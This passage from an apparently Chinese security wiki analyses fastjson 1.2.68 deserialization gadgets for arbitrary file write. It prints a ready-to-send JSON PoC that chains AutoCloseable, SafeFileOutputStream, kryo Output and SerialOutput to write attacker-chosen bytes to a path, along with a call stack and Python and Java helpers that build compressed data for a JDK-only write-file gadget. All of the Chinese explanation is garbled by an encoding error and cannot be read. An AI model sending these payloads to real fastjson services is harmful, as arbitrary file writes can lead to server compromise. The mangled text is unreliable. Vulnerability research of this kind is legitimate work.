tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.aspectj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>aspectjtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.9.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.esotericsoftware<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>kryo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.sleepycat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>je<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>18.3.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€PoCã€‘</strong></p><p><strong>æ³¨æ„æ­¤ poc æ˜¯ä¸èƒ½åˆ›å»ºç›®å½•çš„ï¼Œåªèƒ½åˆ›å»ºæ–‡ä»¶ã€‚</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    &#39;stream&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        &#39;@type&#39;<span class="token operator">:</span> &#39;org.eclipse.core.internal.localstore.SafeFileOutputStream&#39;<span class="token punctuation">,</span>
        &#39;targetPath&#39;<span class="token operator">:</span> &#39;d<span class="token operator">:</span>/tmp/dst&#39;<span class="token punctuation">,</span>
        &#39;tempPath&#39;<span class="token operator">:</span> &#39;d<span class="token operator">:</span>/tmp/src&#39;
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    &#39;writer&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        &#39;@type&#39;<span class="token operator">:</span> &#39;com.esotericsoftware.kryo.io.Output&#39;<span class="token punctuation">,</span>
        &#39;buffer&#39;<span class="token operator">:</span> &#39;dGVzdCBieSBtb2Iu&#39;<span class="token punctuation">,</span>
        &#39;outputStream&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
            &#39;$ref&#39;<span class="token operator">:</span> &#39;$.stream&#39;
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        &#39;position&#39;<span class="token operator">:</span> <span class="token number">12</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    &#39;close&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        &#39;@type&#39;<span class="token operator">:</span> &#39;com.sleepycat.bind.serial.SerialOutput&#39;<span class="token punctuation">,</span>
        &#39;out&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
            &#39;$ref&#39;<span class="token operator">:</span> &#39;$.writer&#39;
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li>é¦–å…ˆé€šè¿‡ <code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code>â€‹ çš„æ„é€ æ–¹æ³•**<mark>åˆ›å»ºä¸€ä¸ªè¾“å‡ºæµå¯¹è±¡</mark>**ï¼Œå¹¶é€šè¿‡å‚æ•°å»æŒ‡å®šç›®æ ‡è·¯å¾„ <code>/tmp/dst</code>â€‹ã€‚å’Œä¸Šä¸€ä¸ªå¤åˆ¶æ–‡ä»¶ä½¿ç”¨çš„æ–¹æ³•ä¸€æ ·ï¼Œä¸è¿‡æŒ‡å®šçš„æ–‡ä»¶éƒ½ä¸å­˜åœ¨ï¼Œæ‰€ä»¥åˆ›å»ºè¾“å‡ºæµå¯¹è±¡ã€‚</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428110012-vuxnfzw.c015b523.png" alt="image" loading="lazy">â€‹</p><p><strong>ã€<strong>â€‹<strong><strong>â€‹</strong></strong>â€‹</strong>æ³¨</strong> <strong>ã€‘</strong> è¿™é‡Œç¬¬äºŒæ¬¡è¿è¡Œå°±ä¼šå˜æˆå¤åˆ¶æ–‡ä»¶äº†ã€‚</p><ol start="2"><li>ç„¶åé€šè¿‡ <code>com.esotericsoftware.kryo.io.Output</code>â€‹ çš„**<mark>æ— å‚æ„é€ æ–¹æ³•</mark>**ï¼ˆ&quot;æœ‰æ— å‚æ„é€ å‡½æ•°å°±ä¼šè°ƒç”¨æ— å‚æ„é€ å‡½æ•°&quot;[^1]ï¼‰åˆ›å»ºè¾“å‡ºæµå¯¹è±¡ï¼Œå¹¶é€šè¿‡ setter æ–¹æ³•å°†è‡ªèº«çš„è¾“å‡ºæµæŒ‡å‘ <code>SafeFileOutputStream</code>â€‹ è¾“å‡ºæµå¯¹è±¡ï¼Œä¸”é€šè¿‡ setter æ–¹æ³•å¾€è‡ªèº«ç¼“å†²åŒºå¡«å……è¦å†™å…¥çš„æ•°æ®ã€‚</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428110946-ufojjrv.0313055b.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428112412-2jz5mxy.6766fcf4.png" alt="image" title="java.lang.reflect.Method#invoke" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428112509-vhqz53a.19d62b32.png" alt="image" title="/com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java:110" loading="lazy">â€‹</p><ol start="3"><li>æœ€åï¼Œå†é€šè¿‡ <code>com.sleepycat.bind.serial.SerialOutput</code>â€‹ çš„æ„é€ æ–¹æ³•åˆ›å»ºè¾“å‡ºæµå¯¹è±¡ï¼Œå¹¶é€šè¿‡å‚æ•°å°†è¾“å‡ºæµæŒ‡å‘ (2) åˆ›å»ºçš„ <code>Output</code>â€‹ å¯¹è±¡ï¼›åŒæ—¶åœ¨ <code>com.sleepycat.bind.serial.SerialOutput</code>â€‹ æ„é€ æ–¹æ³•è°ƒç”¨çš„è¿‡ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨ <code>com.esotericsoftware.kryo.io.Output#flush()</code>â€‹ æ–¹æ³•ï¼Œå°† buffer ç¼“å†²åŒºã€‚</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428120025-f6ryxok.6dc964fa.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428120150-2ocw77t.5a15c39e.png" alt="image" title="com.sleepycat.bind.serial.SerialOutput#SerialOutput" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428120725-izc7tyr.bfcbb43b.png" alt="image" title="java.io.ObjectOutputStream#ObjectOutputStream(java.io.OutputStream)" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428120655-wgmlwwr.ee602e05.png" alt="image" title="  com.esotericsoftware.kryo.io.Output#flush" loading="lazy">â€‹</p><p><strong>ã€éƒ¨åˆ†è°ƒç”¨æ ˆå¦‚ä¸‹ã€‘</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code>flush<span class="token operator">:</span><span class="token number">183</span><span class="token punctuation">,</span> Output (com.esotericsoftware.kryo.io)
require<span class="token operator">:</span><span class="token number">164</span><span class="token punctuation">,</span> Output (com.esotericsoftware.kryo.io)
writeBytes<span class="token operator">:</span><span class="token number">251</span><span class="token punctuation">,</span> Output (com.esotericsoftware.kryo.io)
write<span class="token operator">:</span><span class="token number">219</span><span class="token punctuation">,</span> Output (com.esotericsoftware.kryo.io)
drain<span class="token operator">:</span><span class="token number">1877</span><span class="token punctuation">,</span> ObjectOutputStream$BlockDataOutputStream (java.io)
setBlockDataMode<span class="token operator">:</span><span class="token number">1786</span><span class="token punctuation">,</span> ObjectOutputStream$BlockDataOutputStream (java.io)
&lt;init&gt;<span class="token operator">:</span><span class="token number">247</span><span class="token punctuation">,</span> ObjectOutputStream (java.io)
&lt;init&gt;<span class="token operator">:</span><span class="token number">81</span><span class="token punctuation">,</span> SerialOutput (com.sleepycat.bind.serial)
newInstance0<span class="token operator">:</span><span class="token number">-1</span><span class="token punctuation">,</span> NativeConstructorAccessorImpl (sun.reflect)
newInstance<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">,</span> NativeConstructorAccessorImpl (sun.reflect)
newInstance<span class="token operator">:</span><span class="token number">45</span><span class="token punctuation">,</span> DelegatingConstructorAccessorImpl (sun.reflect)
newInstance<span class="token operator">:</span><span class="token number">408</span><span class="token punctuation">,</span> Constructor (java.lang.reflect)
deserialze<span class="token operator">:</span><span class="token number">1012</span><span class="token punctuation">,</span> JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€è¿è¡Œç»“æœã€‘</strong></p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428104258-l2uvkkx.7e67e9c0.png" alt="image" loading="lazy">â€‹</p><h3 id="gadget-3-åŸç”Ÿå†™æ–‡ä»¶-â€‹openjdk-11â€‹" tabindex="-1"><a class="header-anchor" href="#gadget-3-åŸç”Ÿå†™æ–‡ä»¶-â€‹openjdk-11â€‹"><span>Gadget 3ï¼šåŸç”Ÿå†™æ–‡ä»¶ï¼ˆâ€‹openjdk &gt;= 11â€‹ï¼‰</span></a></h3><p>è¿™æ˜¯ <a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener noreferrer">@rmb122<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> å‘ç°çš„ä¸€ä¸ªä»…ä¾èµ–äº JDK çš„å†™æ–‡ä»¶ gadgetï¼Œå°½ç®¡å¦‚æ­¤ï¼Œå‰é¢ä¹Ÿæåˆ°äº†ï¼ŒæˆåŠŸä¸å¦å–å†³äºç›®æ ‡ç¨‹åºçš„ JDK æ˜¯å¦å¸¦è°ƒè¯•ä¿¡æ¯ã€‚</p><h4 id="åˆ¶ä½œå‹ç¼©æ•°æ®" tabindex="-1"><a class="header-anchor" href="#åˆ¶ä½œå‹ç¼©æ•°æ®"><span>åˆ¶ä½œå‹ç¼©æ•°æ®</span></a></h4><p><strong>ã€java.util.zip.InflaterOutputStreamã€‘</strong></p><p>â€‹<code>java.util.zip.InflaterOutputStream</code>â€‹ æ˜¯ Java æ ‡å‡†åº“ä¸­çš„ç±»ï¼Œå®ƒç”¨äºå°†æ•°æ®ä»å‹ç¼©æ ¼å¼è§£å‹ç¼©ä¸ºæœªå‹ç¼©æ ¼å¼ï¼Œå¹¶å°†ç»“æœå†™å…¥è¾“å‡ºæµä¸­ã€‚å®ƒçš„æ„é€ å‡½æ•°é€šå¸¸æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šä¸€ä¸ªæ˜¯è¾“å‡ºæµï¼Œå¦ä¸€ä¸ªæ˜¯ <code>java.util.zip.Inflater</code>â€‹ å¯¹è±¡ï¼Œç”¨äºè§£å‹ç¼©æ•°æ®ã€‚</p><p>è¿™ä¸ªç±»çš„ä¸»è¦ä½œç”¨æ˜¯ä»è¾“å…¥æµä¸­è¯»å–<strong>å·²å‹ç¼©çš„æ•°æ®</strong>ï¼Œè§£å‹ç¼©å®ƒï¼Œå¹¶å°†è§£å‹ç¼©åçš„æ•°æ®å†™å…¥æä¾›çš„è¾“å‡ºæµä¸­ã€‚</p><p><strong>ã€åˆ¶ä½œå‹ç¼©æ•°æ®ã€‘</strong></p><p>ç”±äº <code>java.utils.zip.Inflater</code>â€‹ å¤„ç†çš„å‹ç¼©æ•°æ®æ˜¯æ ‡å‡†çš„ zip æ ¼å¼ï¼Œæ‰€ä»¥å¯é€šè¿‡å‘½ä»¤è¡Œç¨‹åº gzipã€openssl æˆ– python è„šæœ¬è°ƒç”¨ zlib åº“å¿«é€Ÿè¾“å‡ºæŒ‡å®šæ˜æ–‡å‹ç¼©åçš„æ•°æ®ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Java çš„ <code>Inflater/Deflater</code>â€‹ è¿™ä¸¤ä¸ªç±»ï¼ŒJDK æ–‡æ¡£é‡Œå°±æœ‰ä»£ç ç‰‡æ®µè¯´æ˜å¦‚ä½•ä½¿ç”¨è¿™ä¸¤ä¸ªç±»æ¥å®ç°å‹ç¼© / è§£å‹ç¼©ï¼Œå‚è€ƒ <a href="http://scz.617.cn:8/web/202008111505.txt" target="_blank" rel="noopener noreferrer">202008111505 (617.cn)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ã€‚</p><p><strong>ã€Pythonã€‘</strong></p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> zlib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64

data <span class="token operator">=</span> sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
compressData <span class="token operator">=</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span>
b64Str <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>compressData<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;åŸæ•°æ®ï¼š &quot;</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;å‹ç¼©åçš„æ•°æ®ï¼ˆbase64 ç¼–ç ï¼‰ï¼š &quot;</span> <span class="token operator">+</span> b64Str<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;å‹ç¼©åçš„å­—èŠ‚æ•° = &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>compressData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

srcData <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>compressData<span class="token punctuation">)</span>
data1 <span class="token operator">=</span> srcData<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è§£å‹åçš„æ•°æ®ï¼š &quot;</span> <span class="token operator">+</span> data1<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428133528-aeft6ek.0a6b85a1.png" alt="image" loading="lazy">â€‹</p><p><strong>ã€Javaã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">util</span><span class="token punctuation">;</span>

<span class="token comment">/*
 * javac -encoding GBK -g DeflateTest.java
 * java DeflateTest src dst 0
 * java DeflateTest dst src 1
 */</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeflateTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">PrivateCopy</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> is<span class="token punctuation">,</span> <span class="token class-name">OutputStream</span> os<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> b<span class="token punctuation">;</span>

        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  <span class="token comment">/* end of PrivateCopy */</span>

    <span class="token comment">// å‹ç¼©æ–‡ä»¶</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">DeflateFile</span><span class="token punctuation">(</span><span class="token class-name">String</span> src<span class="token punctuation">,</span> <span class="token class-name">String</span> dst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dst<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token doc-comment comment">/**
         * https://docs.oracle.com/javase/8/docs/api/java/util/zip/Deflater.html
         * https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/zip/Deflater.html
         *
         * https://docs.oracle.com/javase/8/docs/api/java/util/zip/DeflaterOutputStream.html
         */</span>
        <span class="token class-name">DeflaterOutputStream</span> dos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DeflaterOutputStream</span>
                <span class="token punctuation">(</span>
                        fos<span class="token punctuation">,</span>
                        <span class="token doc-comment comment">/**
                         * If the parameter nowrap is true then the ZLIB header and
                         * checksum fields will not be used.
                         * Params:
                         * level â€“ the compression level (0-9)
                         * nowrap â€“ if true then use GZIP compatible compression
                         */</span>
                        <span class="token keyword">new</span> <span class="token class-name">Deflater</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>
                <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PrivateCopy</span><span class="token punctuation">(</span>fis<span class="token punctuation">,</span> dos<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  <span class="token comment">/* end of DeflateFile */</span>

    <span class="token comment">// è§£å‹æ–‡ä»¶</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">InflateFile</span><span class="token punctuation">(</span><span class="token class-name">String</span> src<span class="token punctuation">,</span> <span class="token class-name">String</span> dst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token doc-comment comment">/**
         * https://docs.oracle.com/javase/8/docs/api/java/util/zip/Inflater.html
         * https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/zip/Inflater.html
         * https://docs.oracle.com/javase/8/docs/api/java/util/zip/InflaterInputStream.html
         */</span>
        <span class="token class-name">InflaterInputStream</span> iis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InflaterInputStream</span>
                <span class="token punctuation">(</span>
                        fis<span class="token punctuation">,</span>
                        <span class="token keyword">new</span> <span class="token class-name">Inflater</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>
                <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dst<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PrivateCopy</span><span class="token punctuation">(</span>iis<span class="token punctuation">,</span> fos<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  <span class="token comment">/* end of InflateFile */</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token comment">// å‹ç¼©ï¼š&quot;D:\Tmp\test.txt&quot; &quot;D:\Tmp\testDeflate.txt&quot; 0</span>
        <span class="token comment">// è§£å‹ï¼š&quot;D:\Tmp\testDeflate.txt&quot; &quot;D:\Tmp\testInflate.txt&quot; 1</span>
        <span class="token class-name">String</span> src <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> dst <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> mode <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">switch</span> <span class="token punctuation">(</span>mode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// å‹ç¼©</span>
            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
                <span class="token class-name">DeflateFile</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token comment">// è§£å‹</span>
            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
                <span class="token class-name">InflateFile</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 